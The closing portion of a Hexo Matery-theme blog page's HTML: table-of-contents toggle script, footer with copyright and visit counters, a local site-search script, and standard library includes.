            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2022</span>
            
            <a href="/about" target="_blank">Gunjyo</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">




    <a href="https://www.facebook.com/gunjyo0817" class="tooltipped" target="_blank" data-tooltip=" https://www.facebook.com/gunjyo0817" data-position="top" data-delay="50">
        <i class="fab fa-facebook-f"></i>
    </a>













</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

    <script src="/js/hexo_resize_image.js"></script>
</body>

</html>
